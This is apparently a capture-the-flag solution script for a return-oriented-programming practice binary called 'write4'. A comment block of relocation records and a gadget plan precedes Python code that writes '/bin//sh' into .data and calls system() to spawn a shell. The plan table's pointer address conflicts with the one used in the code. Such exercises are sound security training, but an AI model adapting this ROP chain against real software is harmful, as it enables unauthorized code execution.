'''

Possible Write Location:
24 .data         00000010  0000000000601050  0000000000601050  00001050  2**3
                  CONTENTS, ALLOC, LOAD, DATA


write4:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__
0000000000601060 R_X86_64_COPY     stdout@@GLIBC_2.2.5
0000000000601070 R_X86_64_COPY     stdin@@GLIBC_2.2.5
0000000000601080 R_X86_64_COPY     stderr@@GLIBC_2.2.5
0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000601020 R_X86_64_JUMP_SLOT  system@GLIBC_2.2.5
0000000000601028 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0000000000601030 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.5
0000000000601038 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5
0000000000601040 R_X86_64_JUMP_SLOT  fgets@GLIBC_2.2.5
0000000000601048 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5

PLAN of ATTACK:
Desired Stack	        Address	            Description
return address		                        who cares unless need graceful
call to system	        0x4005e0	        <system@plt>
ptr to /bin/sh	        0x0000000000400820	.data address holds ptr to /bin/sh
pop rdi; ret	        0x0000000000400893	put our ptr in rdi
write bin/sh to .data	0x0000000000400820	mov qword ptr [r14], r15 ; ret
string to put in r15	/bin//sh	
address to .data	    0x000000601050	
Pop /bin/sh into .data	0x0000000000400890 	pop r14 ; pop r15 ; ret

[$] Buffer + Base Pointer: 40

'''

import struct
import sys

buf = b''
buf += 'A' * 40
buf += struct.pack('<Q', 0x400890) # pop r14 ; pop r15 ; ret
buf += struct.pack('<Q', 0x601050) # address to .data
buf += "/bin//sh"
buf += struct.pack('<Q', 0x400820) # mov qword ptr [r14], r15 ; ret
buf += struct.pack('<Q', 0x400893) # pop rdi; ret
buf += struct.pack('<Q', 0x601050) # ptr to /bin/sh
buf += struct.pack('<Q', 0x4005e0) # call to system
buf += struct.pack('<Q', 0x4005b9) # ret -  let's see what happens

sys.stdout.write(buf)
